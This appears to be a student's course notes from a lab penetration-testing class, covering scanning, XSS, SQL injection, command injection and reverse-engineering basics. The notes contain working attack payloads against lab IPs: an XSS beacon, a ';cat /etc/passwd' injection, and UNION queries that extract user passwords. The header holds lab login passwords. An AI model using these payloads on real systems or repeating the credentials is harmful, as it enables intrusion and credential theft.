09/27/2022

http://10.50.22.9:8000/:  
        DOJO-006-M: Greentea9911$$
ssh student@10.50.38.82 -Y (LINOPS)
grayhost: 10.50.37.221  3t6RPW1ejaWtWC0 (password) (dont log in from greyhost, only from linops)
https://sec.cybbh.io/public/security/latest/index.html
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PENETRATION TESTING OVERVIEW:
  ??? check student guide...
  
  
  
VULNERABILITY AND EXPLOITATION RESEARCH:
  Initial access: 
    Phishing is the most common way.
    Initial access if first hook into sys (whatever method).
  Research:
    Majority of research immediately after recon.
    Research outdated protocols, services, OS.  
      Multi-Source:
        Databases, exploit-DB, CVE's, online articles, MITRE
  Testing:
    Testing exploitations on own stations to verify validitiy of exploits/attacks. Paste-its.
    
  RECON:
    Collections and Use:
      Social Media, Web Data, Sensitive data, Public Accessible, Domain and IP Addr Data collections.
    
  HTML:
    stnd markup language for browser interp of webpages
      clien-side interpret (web browser)
      Utilizes elements (ident by tags)
      Typically redirects to another page for server-side interac
      Cascading Stylesheets(CSS) for page themeing
      
  ***Scanning Tech:
     1:) Host Disc:
        Ping sweep (run on closest to network trying to scan)
             for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
                         ^change based on cidr    ^change based on tgt ip       
     2:) Host Enum:   
        Scan for ports 21-25,80 ; 0-1023 ; abnormal ports 
        For single targets (run at max 3 times):
                nmap -Pn -T4 <ip> -p21-23,80,8080,8888,2222,4444 
     3:) Host Interr:
        NC/Banner grabbing,nikto, nmap double check ports
                nc <ip> <port> (banner grabbing to check if port is the known protocol,etc)
                nmap -sV <ip> -p <ports>
                nikto -h <ip> -p <ports>
                
     ***NMAP Scripting Engine:
       /usr/share/nmap/scripts
       nmap -Pn -T4 <ip> -p <ports> --script=banner.nse 
                                    --script=http-enum.nse <ip> -p <port>      (use to enum well known paths/dir from websites)
       nmap -p 445 --script smb-os-discovery <IP/subnet>        (OS, computer name, netbios name, domain)
       
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
WEB EXPLOITATION DAY1 (XSS):
   Server/Client Relat
     synchronous comms btw user and serv
     not all data is not returned, client only rec what is allowed
   HTTP
     Request/Response, view with tcpdump, wireshark, developer console
     Methods: GET, POST, HEAD, PUT
     Response Codes:
        10XX , info
        2XX, Success
        30X, redir
        4XX, client err
        5XX, Server err
     
   JS Interaction
   'function'

   HTTP Enum
      ROBOTS.TXT
      Legit surfing
      Tools:
        NSE scripts nmap --script=http-enum.nse <ip> -p <port>
        Nikto - nikto -host <ip> -port <port>
        burp suite
   
***Cross-Site Scripting (XSS):
      Reflected XSS
         most common form on XSS
         transient, occurs in error msgs or search results
         deliv thru intermed media, link in email
         char that are normally illegalin URLs can be Base64
      Stored XSS
         resides on vuln site
         only requires user to visit page
                        <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">

  Useful JavaScript Components
        <script>alert('XSS');</script>
    Capturing Cookies
    document.cookie
    Capturing Keystrokes
        bind keydown and keyup
    Capturing Sensitive Data
    document.body.innerHTML

  Server-Side injection
        Dir Path/ Path Traversal
        Ability to read/execute outside web server's dir
        uses ../../ (rel path) in manipul a server-side paths
  Malicious File Upload
        site allows unsanitized file uploads
  Command Injection:
        app on server is vuln, allowing exec of arbit commands
        run following to chain/stack our arbitrary command - ;cat /etc/passwd
----------------------------------------------------------------------------------------------------------------------------------------------------------------
WEB EXPLOITATION DAY2 (SQL):
Common commands:
      SELECT, UPDATE, DELETE, CREATE, DROP
        
*SELECT
Extracts data from a database

*UNION
Used to combine the result-set of two or more SELECT statements

*USE
Selects the DB to use

UPDATE
Updates data in a database

DELETE
Deletes data from a database

INSERT INTO
Inserts new data into a database

CREATE DATABASE
Creates a new database

ALTER DATABASE
Modifies a database

CREATE TABLE
Creates a new table

ALTER TABLE
Modifies a table

DROP TABLE
Deletes a table

CREATE INDEX
Creates an index (search key)

DROP INDEX
Deletes an index
        

COMMON SYNTAX:

mysql (initiates sql database)
show databases;  (; ends/executes command(s))
show tables from session; (session = database)
select * from session.<table>;



select tireid,name,cost from session.<table>;        

use <database> ( changes current location to that database)
show tables;
select * from <table>        


Activity Examples:
SELECT DISTINCT director FROM movies
ORDER BY director ASC;

SELECT title, year FROM movies
ORDER BY Title asc
LIMIT 5;

SELECT title, year FROM movies
ORDER BY Title asc
LIMIT 5 OFFSET 5;

SELECT title, director FROM movies 
WHERE title LIKE "Toy Story%";


SELECT * FROM north_american_cities
where country like "United%"
order by latitude desc;

SELECT city, longitude FROM north_american_cities
WHERE longitude < -87.629798
ORDER BY longitude ASC;

SELECT *FROM north_american_cities
where country = "Mexico"
order by population desc
LIMIT 2;

SELECT *FROM north_american_cities
WHERE country LIKE "United%
ORDER BY population DESC
LIMIT 2 OFFSET 2;



SQL Injections:
    Information_Schema
    GET vs POST Request HTTP methods
    
    POST
    <user>' OR '1=1 in password fields

    GET
        need fields
    <weblocation>/login.php?username=Admin&passwd=user' OR '1=1


POST
'Audi 1='1
GET
http://10.50.42.112/uniondemo.php?Selection=2 or 1=1
http://10.50.42.112/uniondemo.php?Selection=4 or 1=1

http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3#
                      AYYLMAO   Selection=2 UNION select (1,2,...)table_schema,column_name,table_name(4,5,6...) from information_schema.columns where table_name = ''
                                  
custom query                    Selection=2 UNION select name,type,cost from session.car;#
                                Selection=2 UNION select id,pass,name from session.user;#
                                Selection=2 UNION select 1,2,@@version
                                

****SQL by the numbers:
        Browse website as normal & find input fields + variables
        test each field, get and/or post ('or 1='1)
        find total # of columns (Union 1,2,3...)
        Golden Statement
            UNION select ..,..,..,.. from information_schema.columns
        Navigate to Custom Databases
            What are the 3 default
        Make query based on custom Tables + columns
            UNION select ..,..,.. from customtable.customcolumn;#
---------------------------------------------------------------------------------------------------------------------------------------
REVERSE ENGINEERING:
   X86_64 Assembly
    16 general purpose 64-bit reg
    r 64, e 32, non 16
     %rax, first returnregister/value
     %rbp, base pointer that keeps track of the base of the stack
     %rsp, stack pointer that points to the top of stack
     %rip, instruction pointer, holds address for next intruction to be executed
     
     Heap, dynamically allocated and deall
     Stack, "Pez" dispenser, 
     
     Common Instruction Pointers
       JZ
       JNZ
        
     Reverse Engineering Workflow ( Software)
      Static:
        1. Determine file type - Is it an executable? What environment is it designed to run in? (OS,cpu
           architecture, etc)
        2. Determine if file is packed/compressed (UPX)
        3. Find plain text ascii and unicode strings
        4. View imports/exports to get a hint of functionality/calls (is it importing a library that can open a
           socket, etc?)
        5. Look for encrypted sections of the binary
      Behavioral:
        Mod 16 stuff, How the malware runs
      Dynamic:
        1. GDB debuggers
      Disassembly:
        1. IDA/GHIDRA, find artifacts
      Documnet Findings:
        1. Discovered binary traits, capabilities,
        2. docu potential uses for binary, create signatures/mitigations
        3. docu & save tools, scripts, code, methods used to analyze
        








